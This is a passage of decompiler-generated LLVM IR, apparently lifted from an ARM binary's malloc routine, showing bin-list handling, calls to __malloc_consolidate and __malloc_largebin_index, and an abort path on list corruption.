  br label %dec_label_pc_1233c

dec_label_pc_11ab8:                               ; preds = %entry
  %v1_11ab8 = add i32 %v0_11a94, 11
  store i32 %v1_11ab8, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  %v2_11ac4 = icmp ugt i32 %v1_11ab8, 14
  %v7_11ac4 = icmp eq i32 %v1_11ab8, 15
  %v2_11ac8 = xor i1 %v7_11ac4, true
  %v3_11ac8 = and i1 %v2_11ac4, %v2_11ac8
  br i1 %v3_11ac8, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_11ab8
  %v5_11ac8 = and i32 %v1_11ab8, -8
  store i32 %v5_11ac8, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_11ab8, %bb
  %v4_11acc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_11acc, i32* @r0, align 4
  %v1_11ad0 = inttoptr i32 %v4_11acc to i32*
  %v2_11ad0 = load i32, i32* %v1_11ad0, align 4
  store i32 %v2_11ad0, i32* @r4, align 4
  %v2_11ad4 = xor i1 %v2_11ac4, true
  %v3_11ad4 = or i1 %v7_11ac4, %v2_11ad4
  br i1 %v3_11ad4, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_11ad8 = urem i32 %v2_11ad0, 2
  %v2_11ad8 = icmp eq i32 %v1_11ad8, 0
  br i1 %v2_11ad8, label %dec_label_pc_11ae0, label %dec_label_pc_11af0

dec_label_pc_11ae0:                               ; preds = %bb140
  %v2_11ae0 = icmp eq i32 %v2_11ad0, 0
  br i1 %v2_11ae0, label %dec_label_pc_11ae8, label %dec_label_pc_11ecc

dec_label_pc_11ae8:                               ; preds = %dec_label_pc_11ae0
  %v0_11ae8 = call i32 @__malloc_consolidate()
  store i32 %v0_11ae8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ecc

dec_label_pc_11af0:                               ; preds = %bb140
  %v0_11af0 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_11af0, %v2_11ad0
  br i1 %tmp201, label %dec_label_pc_11b18, label %dec_label_pc_11af8

dec_label_pc_11af8:                               ; preds = %dec_label_pc_11af0
  %v1_11af8 = add i32 %v4_11acc, -4
  store i32 %v1_11af8, i32* %r1.global-to-local, align 4
  %v3_11afc = udiv i32 %v0_11af0, 8
  store i32 %v3_11afc, i32* %r2.global-to-local, align 4
  %v4_11b00 = mul nuw i32 %v3_11afc, 4
  %v5_11b00 = add i32 %v4_11b00, %v1_11af8
  %v6_11b00 = inttoptr i32 %v5_11b00 to i32*
  %v7_11b00 = load i32, i32* %v6_11b00, align 4
  store i32 %v7_11b00, i32* %r0.global-to-local, align 4
  %v2_11b04 = icmp eq i32 %v7_11b00, 0
  br i1 %v2_11b04, label %dec_label_pc_11b18, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11af8
  %v2_11b08 = add i32 %v7_11b00, 8
  %v3_11b08 = inttoptr i32 %v2_11b08 to i32*
  %v4_11b08 = load i32, i32* %v3_11b08, align 4
  store i32 %v4_11b08, i32* %r3.global-to-local, align 4
  store i32 %v2_11b08, i32* %r0.global-to-local, align 4
  store i32 %v2_11b08, i32* %r4.global-to-local, align 4
  store i32 %v4_11b08, i32* %v6_11b00, align 4
  br label %dec_label_pc_12320

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11af8, %dec_label_pc_11af0
  %tmp202 = icmp ugt i32 %v0_11af0, 255
  br i1 %tmp202, label %dec_label_pc_11b68, label %dec_label_pc_11b20

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11b18
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11b28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  %v3_11b2c = udiv i32 %v0_11af0, 8
  store i32 %v3_11b2c, i32* @r7, align 4
  %v4_11b30 = mul nuw i32 %v3_11b2c, 8
  %v5_11b30 = add i32 %v4_11b28, %v4_11b30
  store i32 %v5_11b30, i32* %r3.global-to-local, align 4
  %v1_11b34 = add i32 %v5_11b30, 44
  store i32 %v1_11b34, i32* %ip.global-to-local, align 4
  %v1_11b38 = add i32 %v5_11b30, 56
  %v2_11b38 = inttoptr i32 %v1_11b38 to i32*
  %v3_11b38 = load i32, i32* %v2_11b38, align 4
  store i32 %v3_11b38, i32* %r0.global-to-local, align 4
  %v9_11b3c = icmp eq i32 %v3_11b38, %v1_11b34
  br i1 %v9_11b3c, label %dec_label_pc_11cc8, label %dec_label_pc_11b44

dec_label_pc_11b44:                               ; preds = %dec_label_pc_11b20
  %v2_11b44 = add i32 %v3_11b38, %v0_11af0
  store i32 %v2_11b44, i32* %r3.global-to-local, align 4
  %v1_11b48 = add i32 %v2_11b44, 4
  %v2_11b48 = inttoptr i32 %v1_11b48 to i32*
  %v3_11b48 = load i32, i32* %v2_11b48, align 4
  store i32 %v3_11b48, i32* %r2.global-to-local, align 4
  %v1_11b4c = add i32 %v3_11b38, 12
  %v2_11b4c = inttoptr i32 %v1_11b4c to i32*
  %v3_11b4c = load i32, i32* %v2_11b4c, align 4
  store i32 %v3_11b4c, i32* %r1.global-to-local, align 4
  %v1_11b50 = or i32 %v3_11b48, 1
  store i32 %v1_11b50, i32* %r2.global-to-local, align 4
  %v1_11b54 = add i32 %v3_11b38, 8
  store i32 %v1_11b54, i32* %r4.global-to-local, align 4
  store i32 %v1_11b50, i32* %v2_11b48, align 4
  %v0_11b5c = load i32, i32* %ip.global-to-local, align 4
  %v1_11b5c = load i32, i32* %r1.global-to-local, align 4
  %v2_11b5c = add i32 %v1_11b5c, 8
  %v3_11b5c = inttoptr i32 %v2_11b5c to i32*
  store i32 %v0_11b5c, i32* %v3_11b5c, align 4
  %v0_11b60 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b60 = load i32, i32* %ip.global-to-local, align 4
  %v2_11b60 = add i32 %v1_11b60, 12
  %v3_11b60 = inttoptr i32 %v2_11b60 to i32*
  store i32 %v0_11b60, i32* %v3_11b60, align 4
  br label %dec_label_pc_12320

dec_label_pc_11b68:                               ; preds = %dec_label_pc_11b18
  store i32 %v0_11af0, i32* %r0.global-to-local, align 4
  %v1_11b6c = call i32 @__malloc_largebin_index(i32 %v0_11af0)
  store i32 %v1_11b6c, i32* %r0.global-to-local, align 4
  %v0_11b70 = load i32, i32* @r4, align 4
  %v1_11b70 = and i32 %v0_11b70, 2
  %v2_11b70 = icmp eq i32 %v1_11b70, 0
  store i32 %v1_11b6c, i32* @r7, align 4
  br i1 %v2_11b70, label %dec_label_pc_11cc8, label %dec_label_pc_11b7c

dec_label_pc_11b7c:                               ; preds = %dec_label_pc_11b68
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r1.global-to-local, align 4
  %v4_11b84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_11b84, i32* @r0, align 4
  %v0_11b88 = call i32 @__malloc_consolidate()
  store i32 %v0_11b88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cc8

dec_label_pc_11b90:                               ; preds = %dec_label_pc_11cdc
  %v1_11b90 = add i32 %v3_11cdc, 4
  %v2_11b90 = inttoptr i32 %v1_11b90 to i32*
  %v3_11b90 = load i32, i32* %v2_11b90, align 4
  store i32 %v3_11b90, i32* %r3.global-to-local, align 4
  %v0_11b94 = load i32, i32* @sl, align 4
  %v1_11b98 = and i32 %v3_11b90, -4
  store i32 %v1_11b98, i32* %r4.global-to-local, align 4
  %v1_11b9c = add i32 %v3_11cdc, 12
  %v2_11b9c = inttoptr i32 %v1_11b9c to i32*
  %v3_11b9c = load i32, i32* %v2_11b9c, align 4
  store i32 %v3_11b9c, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_11b94, 255
  br i1 %tmp203, label %dec_label_pc_11bf8, label %dec_label_pc_11ba4

dec_label_pc_11ba4:                               ; preds = %dec_label_pc_11b90
  %v9_11ba4 = icmp eq i32 %v3_11b9c, %v0_11bfc
  br i1 %v9_11ba4, label %dec_label_pc_11bac, label %dec_label_pc_11bf8

dec_label_pc_11bac:                               ; preds = %dec_label_pc_11ba4
  %v0_11bac = load i32, i32* @sb, align 4
  %v1_11bac = add i32 %v0_11bac, 48
  %v2_11bac = inttoptr i32 %v1_11bac to i32*
  %v3_11bac = load i32, i32* %v2_11bac, align 4
  store i32 %v3_11bac, i32* %r3.global-to-local, align 4
  %v9_11bb0 = icmp eq i32 %v3_11cdc, %v3_11bac
  br i1 %v9_11bb0, label %dec_label_pc_11bb8, label %dec_label_pc_11bf8

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11bac
  %v1_11bb8 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_11b98, %v1_11bb8
  br i1 %tmp204, label %dec_label_pc_11bc0, label %dec_label_pc_11bf8

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11bb8
  %v2_11bc0 = sub i32 %v1_11b98, %v0_11b94
  store i32 %v2_11bc0, i32* %r2.global-to-local, align 4
  %v2_11bc4 = add i32 %v0_11b94, %v3_11cdc
  store i32 %v2_11bc4, i32* %r3.global-to-local, align 4
  %v1_11bc8 = or i32 %v0_11b94, 1
  store i32 %v1_11bc8, i32* %r0.global-to-local, align 4
  %v1_11bcc = or i32 %v2_11bc0, 1
  store i32 %v1_11bcc, i32* %r1.global-to-local, align 4
  %v1_11bd0 = add i32 %v3_11cdc, 8
  store i32 %v1_11bd0, i32* %r4.global-to-local, align 4
  %v2_11bd4 = add i32 %v0_11bfc, 8
  %v3_11bd4 = inttoptr i32 %v2_11bd4 to i32*
  store i32 %v2_11bc4, i32* %v3_11bd4, align 4
  %v0_11bd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_11bd8 = load i32, i32* %ip.global-to-local, align 4
  %v2_11bd8 = add i32 %v1_11bd8, 12
  %v3_11bd8 = inttoptr i32 %v2_11bd8 to i32*
  store i32 %v0_11bd8, i32* %v3_11bd8, align 4
  %v0_11bdc = load i32, i32* %r0.global-to-local, align 4
  %v1_11bdc = load i32, i32* @r6, align 4
  %v2_11bdc = add i32 %v1_11bdc, 4
  %v3_11bdc = inttoptr i32 %v2_11bdc to i32*
  store i32 %v0_11bdc, i32* %v3_11bdc, align 4
  %v0_11be0 = load i32, i32* %r3.global-to-local, align 4
  %v1_11be0 = load i32, i32* @sb, align 4
  %v2_11be0 = add i32 %v1_11be0, 48
  %v3_11be0 = inttoptr i32 %v2_11be0 to i32*
  store i32 %v0_11be0, i32* %v3_11be0, align 4
  %v0_11be4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11be4 = load i32, i32* %r3.global-to-local, align 4
  %v3_11be4 = add i32 %v1_11be4, %v0_11be4
  %v4_11be4 = inttoptr i32 %v3_11be4 to i32*
  store i32 %v0_11be4, i32* %v4_11be4, align 4
  %v0_11be8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11be8 = load i32, i32* %r3.global-to-local, align 4
  %v2_11be8 = add i32 %v1_11be8, 4
  %v3_11be8 = inttoptr i32 %v2_11be8 to i32*
  store i32 %v0_11be8, i32* %v3_11be8, align 4
  %v0_11bec = load i32, i32* %ip.global-to-local, align 4
  %v1_11bec = load i32, i32* %r3.global-to-local, align 4
  %v2_11bec = add i32 %v1_11bec, 12
  %v3_11bec = inttoptr i32 %v2_11bec to i32*
  store i32 %v0_11bec, i32* %v3_11bec, align 4
  %v0_11bf0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11bf0 = load i32, i32* %r3.global-to-local, align 4
  %v2_11bf0 = add i32 %v1_11bf0, 8
  %v3_11bf0 = inttoptr i32 %v2_11bf0 to i32*
  store i32 %v0_11bf0, i32* %v3_11bf0, align 4
  br label %dec_label_pc_12320

dec_label_pc_11bf8:                               ; preds = %dec_label_pc_11bb8, %dec_label_pc_11bac, %dec_label_pc_11ba4, %dec_label_pc_11b90
  %v9_11bf8 = icmp eq i32 %v1_11b98, %v0_11b94
  %v2_11bfc = add i32 %v3_11b9c, 8
  %v3_11bfc = inttoptr i32 %v2_11bfc to i32*
  store i32 %v0_11bfc, i32* %v3_11bfc, align 4
  %v0_11c00 = load i32, i32* %ip.global-to-local, align 4
  %v1_11c00 = load i32, i32* %r5.global-to-local, align 4
  %v2_11c00 = add i32 %v1_11c00, 12
  %v3_11c00 = inttoptr i32 %v2_11c00 to i32*
  store i32 %v0_11c00, i32* %v3_11c00, align 4
  br i1 %v9_11bf8, label %dec_label_pc_11d58.loopexit, label %dec_label_pc_11c14

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11bf8
  %v0_11c14 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_11c14, 255
  br i1 %tmp205, label %dec_label_pc_11c38, label %dec_label_pc_11c1c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c14
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  %v1_11c20 = load i32, i32* %r8.global-to-local, align 4
  %v2_11c20 = add i32 %v1_11c20, ptrtoint (i32* @global_var_21694.308 to i32)
  %v3_11c20 = inttoptr i32 %v2_11c20 to i32*
  %v4_11c20 = load i32, i32* %v3_11c20, align 4
  %v3_11c24 = udiv i32 %v0_11c14, 8
  store i32 %v3_11c24, i32* %r0.global-to-local, align 4
  %v4_11c28 = mul nuw i32 %v3_11c24, 8
  %v5_11c28 = add i32 %v4_11c20, %v4_11c28
  store i32 %v5_11c28, i32* %r3.global-to-local, align 4
  %v1_11c2c = add i32 %v5_11c28, 44
  store i32 %v1_11c2c, i32* %ip.global-to-local, align 4
  %v1_11c30 = add i32 %v5_11c28, 52
  %v2_11c30 = inttoptr i32 %v1_11c30 to i32*
  %v3_11c30 = load i32, i32* %v2_11c30, align 4
  store i32 %v3_11c30, i32* @lr, align 4
  br label %dec_label_pc_11c90

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11c14
  store i32 %v0_11c14, i32* %r0.global-to-local, align 4
  %v1_11c3c = call i32 @__malloc_largebin_index(i32 %v0_11c14)
  store i32 %v1_11c3c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %ip.global-to-local, align 4
  %v1_11c44 = load i32, i32* %r8.global-to-local, align 4
  %v2_11c44 = add i32 %v1_11c44, ptrtoint (i32* @global_var_21694.308 to i32)
  %v3_11c44 = inttoptr i32 %v2_11c44 to i32*
  %v4_11c44 = load i32, i32* %v3_11c44, align 4
  %v4_11c48 = mul i32 %v1_11c3c, 8
  %v5_11c48 = add i32 %v4_11c44, %v4_11c48
  store i32 %v5_11c48, i32* %r3.global-to-local, align 4
  %v1_11c4c = add i32 %v5_11c48, 44
  store i32 %v1_11c4c, i32* %ip.global-to-local, align 4
  %v1_11c50 = add i32 %v5_11c48, 52
  %v2_11c50 = inttoptr i32 %v1_11c50 to i32*
  %v3_11c50 = load i32, i32* %v2_11c50, align 4
  store i32 %v3_11c50, i32* @lr, align 4
  %v9_11c54 = icmp eq i32 %v3_11c50, %v1_11c4c
  br i1 %v9_11c54, label %dec_label_pc_11c90, label %dec_label_pc_11c5c

dec_label_pc_11c5c:                               ; preds = %dec_label_pc_11c38
  %v1_11c5c = add i32 %v5_11c48, 56
  %v2_11c5c = inttoptr i32 %v1_11c5c to i32*
  %v3_11c5c = load i32, i32* %v2_11c5c, align 4
  store i32 %v3_11c5c, i32* %r1.global-to-local, align 4
  %v1_11c60 = add i32 %v3_11c5c, 4
  %v2_11c60 = inttoptr i32 %v1_11c60 to i32*
  %v3_11c60 = load i32, i32* %v2_11c60, align 4
  store i32 %v3_11c60, i32* %r3.global-to-local, align 4
  %v0_11c64 = load i32, i32* %r4.global-to-local, align 4
  %v3_11c64 = icmp ult i32 %v0_11c64, %v3_11c60
  br i1 %v3_11c64, label %.thread, label %dec_label_pc_11c80.preheader

.thread:                                          ; preds = %dec_label_pc_11c5c
  store i32 %v1_11c4c, i32* @lr, align 4
  store i32 %v3_11c5c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c90

dec_label_pc_11c80.preheader:                     ; preds = %dec_label_pc_11c5c
  %v2_11c6c = or i32 %v0_11c64, 1
  store i32 %v2_11c6c, i32* %r2.global-to-local, align 4
  %v1_11c80179 = add i32 %v3_11c50, 4
  %v2_11c80180 = inttoptr i32 %v1_11c80179 to i32*
  %v3_11c80181 = load i32, i32* %v2_11c80180, align 4
  store i32 %v3_11c80181, i32* %r3.global-to-local, align 4
  %v3_11c84183 = icmp ult i32 %v2_11c6c, %v3_11c80181
  br i1 %v3_11c84183, label %dec_label_pc_11c7c, label %dec_label_pc_11c8c

dec_label_pc_11c7c:                               ; preds = %dec_label_pc_11c80.preheader, %dec_label_pc_11c7c
  %v0_11c8c184 = phi i32 [ %v3_11c7c, %dec_label_pc_11c7c ], [ %v3_11c50, %dec_label_pc_11c80.preheader ]
  %v1_11c7c = add i32 %v0_11c8c184, 8
  %v2_11c7c = inttoptr i32 %v1_11c7c to i32*
  %v3_11c7c = load i32, i32* %v2_11c7c, align 4
  store i32 %v3_11c7c, i32* @lr, align 4
  %v1_11c80 = add i32 %v3_11c7c, 4
  %v2_11c80 = inttoptr i32 %v1_11c80 to i32*
  %v3_11c80 = load i32, i32* %v2_11c80, align 4
  store i32 %v3_11c80, i32* %r3.global-to-local, align 4
  %v3_11c84 = icmp ult i32 %v2_11c6c, %v3_11c80
  br i1 %v3_11c84, label %dec_label_pc_11c7c, label %dec_label_pc_11c8c

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11c7c, %dec_label_pc_11c80.preheader
  %v0_11c8c.lcssa = phi i32 [ %v3_11c50, %dec_label_pc_11c80.preheader ], [ %v3_11c7c, %dec_label_pc_11c7c ]
  %v1_11c8c = add i32 %v0_11c8c.lcssa, 12
  %v2_11c8c = inttoptr i32 %v1_11c8c to i32*
  %v3_11c8c = load i32, i32* %v2_11c8c, align 4
  store i32 %v3_11c8c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c90

dec_label_pc_11c90:                               ; preds = %.thread, %dec_label_pc_11c38, %dec_label_pc_11c1c, %dec_label_pc_11c8c
  %v0_11cb0 = phi i32 [ %v1_11c4c, %dec_label_pc_11c38 ], [ %v1_11c2c, %dec_label_pc_11c1c ], [ %v3_11c8c, %dec_label_pc_11c8c ], [ %v3_11c5c, %.thread ]
  %v0_11ca4 = phi i32 [ %v1_11c3c, %dec_label_pc_11c38 ], [ %v3_11c24, %dec_label_pc_11c1c ], [ %v1_11c3c, %dec_label_pc_11c8c ], [ %v1_11c3c, %.thread ]
  %v1_11c94 = phi i32 [ %v1_11c44, %dec_label_pc_11c38 ], [ %v1_11c20, %dec_label_pc_11c1c ], [ %v1_11c44, %dec_label_pc_11c8c ], [ %v1_11c44, %.thread ]
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  %v2_11c94 = add i32 %v1_11c94, ptrtoint (i32* @global_var_21694.308 to i32)
  %v3_11c94 = inttoptr i32 %v2_11c94 to i32*
  %v4_11c94 = load i32, i32* %v3_11c94, align 4
  %v3_11c98 = sdiv i32 %v0_11ca4, 32
  store i32 %v3_11c98, i32* %r3.global-to-local, align 4
  %v4_11c9c = mul nsw i32 %v3_11c98, 4
  %v5_11c9c = add i32 %v4_11c94, %v4_11c9c
  store i32 %v5_11c9c, i32* %r1.global-to-local, align 4
  %v1_11ca0 = add i32 %v5_11c9c, 820
  %v2_11ca0 = inttoptr i32 %v1_11ca0 to i32*
  %v3_11ca0 = load i32, i32* %v2_11ca0, align 4
  %v1_11ca4 = urem i32 %v0_11ca4, 32
  store i32 %v1_11ca4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_11cac = shl i32 1, %v1_11ca4
  %v8_11cac = or i32 %v3_11ca0, %v7_11cac
  store i32 %v8_11cac, i32* %r3.global-to-local, align 4
  %v1_11cb0 = load i32, i32* @r6, align 4
  %v2_11cb0 = add i32 %v1_11cb0, 12
  %v3_11cb0 = inttoptr i32 %v2_11cb0 to i32*
  store i32 %v0_11cb0, i32* %v3_11cb0, align 4
  %v0_11cb4 = load i32, i32* @lr, align 4
  %v1_11cb4 = load i32, i32* @r6, align 4
  %v2_11cb4 = add i32 %v1_11cb4, 8
  %v3_11cb4 = inttoptr i32 %v2_11cb4 to i32*
  store i32 %v0_11cb4, i32* %v3_11cb4, align 4
  %v0_11cb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_11cb8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11cb8 = add i32 %v1_11cb8, 820
  %v3_11cb8 = inttoptr i32 %v2_11cb8 to i32*
  store i32 %v0_11cb8, i32* %v3_11cb8, align 4
  %v0_11cbc = load i32, i32* @r6, align 4
  %v1_11cbc = load i32, i32* @lr, align 4
  %v2_11cbc = add i32 %v1_11cbc, 12
  %v3_11cbc = inttoptr i32 %v2_11cbc to i32*
  store i32 %v0_11cbc, i32* %v3_11cbc, align 4
  %v0_11cc0 = load i32, i32* @r6, align 4
  %v1_11cc0 = load i32, i32* %ip.global-to-local, align 4
  %v2_11cc0 = add i32 %v1_11cc0, 8
  %v3_11cc0 = inttoptr i32 %v2_11cc0 to i32*
  store i32 %v0_11cc0, i32* %v3_11cc0, align 4
  %v0_11cdc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11cdc

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_11b68, %dec_label_pc_11b20, %dec_label_pc_11b7c
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r1.global-to-local, align 4
  %v4_11cd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_11cd0, i32* @sb, align 4
  %v0_11cd4 = load i32, i32* @sl, align 4
  %v1_11cd4 = add i32 %v0_11cd4, 16
  store i32 %v1_11cd4, i32* @fp, align 4
  %v1_11cd8 = add i32 %v4_11cd0, 52
  store i32 %v1_11cd8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11cdc

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11c90, %dec_label_pc_11cc8
  %v0_11bfc = phi i32 [ %v0_11cdc.pre, %dec_label_pc_11c90 ], [ %v1_11cd8, %dec_label_pc_11cc8 ]
  %v1_11cdc = add i32 %v0_11bfc, 12
  %v2_11cdc = inttoptr i32 %v1_11cdc to i32*
  %v3_11cdc = load i32, i32* %v2_11cdc, align 4
  store i32 %v3_11cdc, i32* @r6, align 4
  %v9_11ce0 = icmp eq i32 %v3_11cdc, %v0_11bfc
  br i1 %v9_11ce0, label %dec_label_pc_11ce8, label %dec_label_pc_11b90

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11cdc
  %v0_11ce8 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_11ce8, 256
  %v0_11da0.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_11ce8.dec_label_pc_11da0_crit_edge, label %dec_label_pc_11cf0

dec_label_pc_11ce8.dec_label_pc_11da0_crit_edge:  ; preds = %dec_label_pc_11ce8
  %.pre200 = mul i32 %v0_11da0.pre, 8
  br label %dec_label_pc_11da0

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11ce8
  %v4_11cf0 = mul i32 %v0_11da0.pre, 8
  %v5_11cf0 = add i32 %v4_11cf0, %v0_11bfc
  store i32 %v5_11cf0, i32* %r3.global-to-local, align 4
  %v1_11cf4 = add i32 %v5_11cf0, -8
  store i32 %v1_11cf4, i32* %r1.global-to-local, align 4
  %v1_11cf8 = add i32 %v5_11cf0, 4
  %v2_11cf8 = inttoptr i32 %v1_11cf8 to i32*
  %storemerge.pre = load i32, i32* %v2_11cf8, align 4
  br label %dec_label_pc_11d98

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11d98
  %v1_11d00 = add i32 %v1_11d28, 4
  %v2_11d00 = inttoptr i32 %v1_11d00 to i32*
  %v3_11d00 = load i32, i32* %v2_11d00, align 4
  store i32 %v3_11d00, i32* %r3.global-to-local, align 4
  %v1_11d04 = and i32 %v3_11d00, -4
  store i32 %v1_11d04, i32* %r2.global-to-local, align 4
  %v3_11d08 = icmp ult i32 %v1_11d04, %v0_11ce8
  %v1_11d0c = add i32 %v1_11d28, 12
  %v2_11d0c = inttoptr i32 %v1_11d0c to i32*
  %v3_11d0c = load i32, i32* %v2_11d0c, align 4
  store i32 %v3_11d0c, i32* %r0.global-to-local, align 4
  br i1 %v3_11d08, label %dec_label_pc_11d98, label %dec_label_pc_11d14

dec_label_pc_11d14:                               ; preds = %dec_label_pc_11d00
  %v1_11d14 = add i32 %v1_11d28, 8
  %v2_11d14 = inttoptr i32 %v1_11d14 to i32*
  %v3_11d14 = load i32, i32* %v2_11d14, align 4
  store i32 %v3_11d14, i32* %r1.global-to-local, align 4
  %v1_11d18 = add i32 %v3_11d14, 12
  %v2_11d18 = inttoptr i32 %v1_11d18 to i32*
  %v3_11d18 = load i32, i32* %v2_11d18, align 4
  store i32 %v3_11d18, i32* %r3.global-to-local, align 4
  %v9_11d1c = icmp eq i32 %v3_11d18, %v1_11d28
  br i1 %v9_11d1c, label %dec_label_pc_11d24, label %dec_label_pc_11d30

dec_label_pc_11d24:                               ; preds = %dec_label_pc_11d14
  %v1_11d24 = add i32 %v3_11d0c, 8
  %v2_11d24 = inttoptr i32 %v1_11d24 to i32*
  %v3_11d24 = load i32, i32* %v2_11d24, align 4
  store i32 %v3_11d24, i32* %r3.global-to-local, align 4
  %v9_11d28 = icmp eq i32 %v3_11d24, %v1_11d28
  br i1 %v9_11d28, label %dec_label_pc_11d34, label %dec_label_pc_11d30

dec_label_pc_11d30:                               ; preds = %dec_label_pc_11d14, %dec_label_pc_11d24
  %v0_11d30 = call i32 @abort()
  store i32 %v0_11d30, i32* %r0.global-to-local, align 4
  %v0_11d34.pre = load i32, i32* @sl, align 4
  %v1_11d34.pre = load i32, i32* @r2, align 4
  %v0_11d3c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11d34

dec_label_pc_11d34:                               ; preds = %dec_label_pc_11d24, %dec_label_pc_11d30
  %v1_11d3c = phi i32 [ %v3_11d0c, %dec_label_pc_11d24 ], [ %v0_11d30, %dec_label_pc_11d30 ]
  %v0_11d3c = phi i32 [ %v3_11d14, %dec_label_pc_11d24 ], [ %v0_11d3c.pre, %dec_label_pc_11d30 ]
  %v1_11d34 = phi i32 [ %v1_11d04, %dec_label_pc_11d24 ], [ %v1_11d34.pre, %dec_label_pc_11d30 ]
  %v0_11d34 = phi i32 [ %v0_11ce8, %dec_label_pc_11d24 ], [ %v0_11d34.pre, %dec_label_pc_11d30 ]
  %v2_11d34 = sub i32 %v1_11d34, %v0_11d34
  store i32 %v2_11d34, i32* %lr.global-to-local, align 4
  %v2_11d3c = add i32 %v1_11d3c, 8
  %v3_11d3c = inttoptr i32 %v2_11d3c to i32*
  store i32 %v0_11d3c, i32* %v3_11d3c, align 4
  %v0_11d40 = load i32, i32* %r0.global-to-local, align 4
  %v1_11d40 = load i32, i32* %r1.global-to-local, align 4
  %v2_11d40 = add i32 %v1_11d40, 12
  %v3_11d40 = inttoptr i32 %v2_11d40 to i32*
  store i32 %v0_11d40, i32* %v3_11d40, align 4
  %v0_11d44 = load i32, i32* %ip.global-to-local, align 4
  %v1_11d44 = add i32 %v0_11d44, 8
  store i32 %v1_11d44, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_11d34, 15
  br i1 %tmp207, label %dec_label_pc_11d64, label %dec_label_pc_11d4c

dec_label_pc_11d4c:                               ; preds = %dec_label_pc_11d34
  %v1_11d4c = load i32, i32* %r2.global-to-local, align 4
  %v2_11d4c = add i32 %v1_11d4c, %v0_11d44
  store i32 %v2_11d4c, i32* %r2.global-to-local, align 4
  %v1_11d50 = add i32 %v2_11d4c, 4
  %v2_11d50 = inttoptr i32 %v1_11d50 to i32*
  %v3_11d50 = load i32, i32* %v2_11d50, align 4
  store i32 %v3_11d50, i32* %r3.global-to-local, align 4
  store i32 %v1_11d44, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d58

dec_label_pc_11d58.loopexit:                      ; preds = %dec_label_pc_11bf8
  %v1_11c04 = load i32, i32* @r6, align 4
  %v2_11c04 = load i32, i32* @sl, align 4
  %v3_11c04 = add i32 %v2_11c04, %v1_11c04
  store i32 %v3_11c04, i32* %r2.global-to-local, align 4
  %v2_11c08 = add i32 %v3_11c04, 4
  %v3_11c08 = inttoptr i32 %v2_11c08 to i32*
  %v4_11c08 = load i32, i32* %v3_11c08, align 4
  store i32 %v4_11c08, i32* %r3.global-to-local, align 4
  %v2_11c0c = add i32 %v1_11c04, 8
  store i32 %v2_11c0c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d58

dec_label_pc_11d58:                               ; preds = %.dec_label_pc_11d58_crit_edge, %dec_label_pc_11d58.loopexit, %dec_label_pc_11d4c
  %v1_11d5c = phi i32 [ %v4_11e80, %.dec_label_pc_11d58_crit_edge ], [ %v3_11c04, %dec_label_pc_11d58.loopexit ], [ %v2_11d4c, %dec_label_pc_11d4c ]
